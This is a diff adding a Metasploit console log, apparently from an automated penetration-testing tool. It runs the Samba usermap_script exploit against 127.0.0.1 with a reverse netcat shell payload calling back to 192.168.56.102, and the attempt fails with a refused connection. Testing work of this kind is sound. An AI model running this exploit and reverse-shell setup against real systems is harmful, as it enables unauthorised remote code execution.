@@ -1,0 +1,16 @@
+[1m[34m[*][0m Processing modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc for ERB directives.
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> use exploit/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> set RHOSTS 127.0.0.1
+[0mRHOSTS => 127.0.0.1
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> set LHOST 192.168.56.102
+[0mLHOST => 192.168.56.102
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> set ExitOnSession true
+[0m[1m[33m[!][0m Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.102:4444 
+[1m[31m[-][0m 127.0.0.1:139 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (127.0.0.1:139).
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/127_0_0_1_samba.rc)> exit
+[0m
